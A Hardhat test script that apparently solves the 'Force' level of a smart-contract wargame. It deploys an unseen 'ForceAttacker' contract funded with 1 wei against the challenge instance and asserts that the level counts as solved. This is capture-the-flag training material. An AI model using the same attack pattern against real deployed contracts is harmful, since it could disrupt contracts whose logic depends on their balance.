import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Force`);
  const challengeAddress = await createChallenge(
    `0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  const attackerFactory = await ethers.getContractFactory(`ForceAttacker`);
  attacker = await attackerFactory.deploy(challenge.address, {
    value: ethers.utils.parseUnits(`1`, `wei`),
  });
  await eoa.provider!.waitForTransaction(attacker.deployTransaction.hash);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
